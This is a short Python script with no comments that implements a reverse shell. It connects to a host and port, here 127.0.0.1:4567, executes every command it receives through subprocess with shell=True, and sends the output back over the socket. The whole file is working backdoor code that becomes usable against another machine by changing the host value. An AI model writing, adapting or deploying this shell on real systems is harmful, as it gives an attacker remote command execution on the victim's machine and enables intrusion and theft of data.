import socket
import subprocess

s = socket.socket()
host = '127.0.0.1'
port = 4567

s.connect((host,port))

while True:
    data = s.recv(1024)
    rdata = data.decode()
    if not data:
        break
    cmd = subprocess.Popen(rdata,shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    cmd_bytes = cmd.stdout.read() + cmd.stderr.read()
    cmd_r = str(cmd_bytes)
    s.send(cmd_r.encode())
    
s.close()